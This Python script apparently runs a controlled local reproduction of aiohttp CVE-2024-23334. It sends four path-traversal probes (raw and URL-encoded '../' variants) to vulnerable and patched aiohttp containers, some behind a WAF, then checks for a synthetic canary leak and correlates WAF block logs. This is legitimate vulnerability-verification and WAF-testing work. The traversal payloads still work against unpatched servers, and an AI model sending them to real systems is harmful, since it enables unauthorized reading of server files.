"""Local-only, synthetic aiohttp CVE-2024-23334 controlled proof.

No arbitrary URL support, only fixed 127.0.0.1 ports and synthetic canary.
Returns an evidence JSON and does not claim success without a vulnerable direct
oracle AND patched direct negative control. WAF protection needs correlated CRS.
"""
from __future__ import annotations
import argparse
from datetime import datetime,timezone
from pathlib import Path
import hashlib, http.client, json, subprocess, sys, time

ROOT=Path(__file__).resolve().parents[2]
HERE=Path(__file__).resolve().parent
COMPOSE=["docker","compose","-f",str(HERE/"cve_compose.yaml")]
DEST=ROOT/"results"/"checkpoint"/"go-lab-v2"
CANARY="TRACE_CVE_2024_23334_SYNTHETIC_MARKER\n"
PUBLIC="TRACE_CVE_PUBLIC_OK\n"
SERVICES={"vuln_direct":18190,"fixed_direct":18191,"vuln_waf":18192,"fixed_waf":18193}
PROBES={
 "raw_dotdot":"/static/../trace-only-cve-marker.txt",
 "encoded_dotdot":"/static/%2e%2e/trace-only-cve-marker.txt",
 "encoded_slash":"/static/..%2ftrace-only-cve-marker.txt",
 "encoded_dotdot_slash":"/static/%2e%2e%2ftrace-only-cve-marker.txt",
}

def timestamp():return datetime.now(timezone.utc).isoformat()
def sha(b):return hashlib.sha256(b).hexdigest()
def save(path,record):
 path.parent.mkdir(parents=True,exist_ok=True)
 tmp=path.with_name(path.name+".new")
 tmp.write_text(json.dumps(record,ensure_ascii=False,indent=2)+"\n",encoding="utf-8")
 tmp.replace(path)

def cmd(args,out=None,timeout=180):
 try:
  r=subprocess.run(args,cwd=ROOT,capture_output=True,text=True,timeout=timeout)
  x={"cmd":args,"returncode":r.returncode,"stdout":r.stdout[-500000:],"stderr":r.stderr[-80000:],"utc":timestamp()}
 except Exception as e:x={"cmd":args,"error":str(e),"utc":timestamp()}
 if out:save(out,x)
 return x

def get(port,target,rid):
 c=http.client.HTTPConnection("127.0.0.1",port,timeout=6)
 try:
  c.putrequest("GET",target,skip_accept_encoding=True)
  c.putheader("X-Trace-Request",rid)
  c.putheader("Connection","close")
  c.endheaders()
  r=c.getresponse();data=r.read(100000)
  return {"status":r.status,"text":data.decode("utf-8",errors="replace")[:1500],
          "sha256":sha(data),"marker":data.decode("utf-8",errors="replace")==CANARY,
          "echo":r.getheader("X-Trace-Request"),"content_type":r.getheader("Content-Type")}
 except (OSError, TimeoutError,http.client.HTTPException) as e:
  return {"error":type(e).__name__,"message":str(e)[:220]}
 finally:c.close()

def probe_version(port,version,timeout=75):
 deadline=time.monotonic()+timeout
 history=[]
 while time.monotonic()<deadline:
  r=get(port,"/meta",f"trace-cve-v2-health-{version}")
  if len(history)<4 or r!=history[-1]:history.append(r)
  if r.get("status")==200:
   try:
    body=json.loads(r["text"])
    if body.get("product")=="aiohttp" and body.get("version")==version:
     return {"ok":True,"meta":body,"attempts_sample":history}
   except json.JSONDecodeError:pass
  time.sleep(2)
 return {"ok":False,"attempts_sample":history}

def match_audit(logtext,request_id):
 for line in logtext.splitlines():
  at=line.find('{"transaction":')
  if at<0:continue
  try:e=json.loads(line[at:]);t=e.get("transaction",e)
  except ValueError:continue
  headers=t.get("request",{}).get("headers",{})
  if isinstance(headers,dict):
   h={str(k).lower():v for k,v in headers.items()}
   if h.get("x-trace-request")!=request_id:continue
  else:continue
  msgs=t.get("messages",[])
  ids=[]
  for m in msgs:
   if not isinstance(m,dict):continue
   details=m.get("details",{})
   rid=details.get("ruleId") or details.get("rule_id") or m.get("ruleId")
   if rid:ids.append(str(rid))
  resp=t.get("response",{})
  return {"matched":True,"rules":ids,"status":resp.get("http_code") or resp.get("status"),"has_crs_block":"949110" in ids}
 return {"matched":False,"rules":[],"has_crs_block":False}

def do_run():
 stamp=datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S%fZ")
 out=DEST/stamp/"cve";out.mkdir(parents=True,exist_ok=False)
 evidence={"started":timestamp(),"experiment":"CVE-2024-23334-local-synthetic", "status":"INCOMPLETE",
           "expected_versions":{"vuln":"3.9.1","fixed":"3.9.2"},
           "compose_sha256":sha((HERE/"cve_compose.yaml").read_bytes()),
           "public_controls":{},"records":[],"waf_classification":{}}
 started=False
 try:
  config=cmd(COMPOSE+["config","--quiet"],out/"config.json")
  if config.get("returncode")!=0:raise RuntimeError("Invalid Docker Compose configuration")
  started=True
  up=cmd(COMPOSE+["up","-d","--build","--force-recreate"],out/"docker_up.json",timeout=500)
  if up.get("returncode")!=0:raise RuntimeError("Compose build/start failed")
  evidence["docker_ps"]=cmd(COMPOSE+["ps","--all"],out/"docker_ps.json")
  evidence["docker_images"]=cmd(COMPOSE+["images","--format","json"],out/"docker_images.json")
  vers={}
  for label,port in SERVICES.items():
   expected="3.9.1" if label.startswith("vuln") else "3.9.2"
   v=probe_version(port,expected);vers[label]=v
   if not v["ok"]:raise RuntimeError(f"{label} did not identify aiohttp {expected}; inspect docker_ps.json and container logs")
  evidence["verified_runtime"]=vers
  for name,uri in [("public","/static/public.txt"),*PROBES.items()]:
   for label,port in SERVICES.items():
    rid=f"trace-cve-v2-{name}-{label}"
    result=get(port,uri,rid)
    evidence["records"].append({"label":name,"service":label,"uri":uri,"rid":rid,"result":result})
  for service in ["vuln","fixed","waf-vuln","waf-fixed"]:
   cmd(COMPOSE+["logs","--no-color",service],out/(service+"-logs.json"),timeout=50)
  v_logs=json.loads((out/"waf-vuln-logs.json").read_text()).get("stdout","")
  f_logs=json.loads((out/"waf-fixed-logs.json").read_text()).get("stdout","")
  data={(r["label"],r["service"]):r for r in evidence["records"]}
  evidence["public_controls"]={k:data[("public",k)]["result"].get("text")==PUBLIC for k in SERVICES}
  direct=[];fixedleak=[]
  for probe in PROBES:
   a=data[(probe,"vuln_direct")]["result"]
   f=data[(probe,"fixed_direct")]["result"]
   w=data[(probe,"vuln_waf")]
   waf=w["result"]
   audit=match_audit(v_logs,w["rid"])
   w["audit"]=audit
   if a.get("marker"):direct.append(probe)
   if f.get("marker"):fixedleak.append(probe)
   if not a.get("marker"):state="DIRECT_EXPLOIT_NOT_OBSERVED"
   elif waf.get("marker"):state="WAF_BYPASS_MARKER_OBSERVED"
   elif waf.get("status")==403 and audit["has_crs_block"]:state="WAF_BLOCK_CORROBORATED"
   else:state="WAF_INCONCLUSIVE_PROXY_OR_OTHER"
   evidence["waf_classification"][probe]=state
  evidence["vulnerable_direct_exploits"]=direct
  evidence["patched_direct_exploits"]=fixedleak
  evidence["cve_confirmed"]=bool(all(evidence["public_controls"].values()) and direct and not fixedleak)
  evidence["waf_protection_confirmed"]=bool(evidence["cve_confirmed"] and any(
        evidence["waf_classification"][p]=="WAF_BLOCK_CORROBORATED" for p in direct) and
        all(evidence["waf_classification"][p]=="WAF_BLOCK_CORROBORATED" for p in direct))
  evidence["status"]=("CVE_AND_WAF_CONFIRMED" if evidence["waf_protection_confirmed"] else
                     "CVE_CONFIRMED_WAF_NOT_CONFIRMED" if evidence["cve_confirmed"] else
                     "CVE_REPRODUCTION_NOT_CONFIRMED")
 except Exception as e:
  evidence["status"]="INCOMPLETE"
  evidence["error"]=f"{type(e).__name__}: {e}"
 finally:
  if started:
   for service in ["vuln","fixed","waf-vuln","waf-fixed"]:
    p=out/(service+"-logs.json")
    if not p.exists():cmd(COMPOSE+["logs","--no-color",service],p,timeout=45)
   evidence["cleanup"]=cmd(COMPOSE+["down","--remove-orphans"],out/"docker_down.json")
  evidence["finished"]=timestamp()
  save(out/"cve_v2_summary.json",evidence)
 print(json.dumps({"status":evidence["status"],"evidence":str(out),
       "vulnerable_direct_exploits":evidence.get("vulnerable_direct_exploits"),
       "patched_direct_exploits":evidence.get("patched_direct_exploits"),
       "waf":evidence["waf_classification"],"error":evidence.get("error")},ensure_ascii=False,indent=2))
 return 0 if evidence["status"]=="CVE_AND_WAF_CONFIRMED" else 2

if __name__=="__main__":
 parser=argparse.ArgumentParser(description=__doc__)
 parser.add_argument("--run",action="store_true",required=True)
 a=parser.parse_args()
 sys.exit(do_run())
